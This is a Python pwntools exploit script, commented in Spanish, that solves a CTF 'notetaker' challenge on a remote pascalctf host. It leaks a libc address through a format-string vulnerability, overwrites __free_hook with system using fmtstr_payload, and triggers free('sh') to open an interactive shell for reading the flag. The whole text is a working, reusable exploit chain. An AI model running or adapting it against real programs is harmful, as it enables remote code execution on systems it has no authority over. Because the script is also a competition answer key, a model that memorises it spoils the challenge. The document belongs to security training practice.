from pwn import *

# 1. Configuración
exe = context.binary = ELF('./notetaker_patched')
libc = ELF('./libs/libc.so.6')

io = remote('notetaker.ctf.pascalctf.it', 9002)

def add_note(content):
    io.sendlineafter(b"> ", b"2")
    io.sendafter(b"note: ", content)

def show_note():
    io.sendlineafter(b"> ", b"1")

# --- PASO 1: LEAK ---
add_note(b"LEAK:%1$p.END")
show_note()
io.recvuntil(b"LEAK:")
leak = int(io.recvuntil(b".END", drop=True), 16)
libc.address = leak - 0x3c6b28 
log.success(f"LIBC Base: {hex(libc.address)}")

# --- PASO 2: ESCRITURA ---
free_hook = libc.symbols['__free_hook']
system_addr = libc.symbols['system']

log.info("Escribiendo system en __free_hook...")
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='short')
add_note(payload)

# TRIGGER Y LIMPIEZA
show_note() # Esto dispara el printf y escribe en el hook
log.info("Limpiando basura del printf (44KB+)...")

# Leemos todo hasta que veamos el menú de nuevo para vaciar el buffer
io.recvuntil(b"4. Exit")
io.recvuntil(b"> ")

# --- PASO 3: SHELL INTERACTIVA ---
log.info("Lanzando shell... Escribe 'ls' y 'cat flag.txt' cuando aparezca el prompt")
io.sendline(b"sh") # Enviamos 'sh'. El free("sh") activará system("sh")

io.interactive()
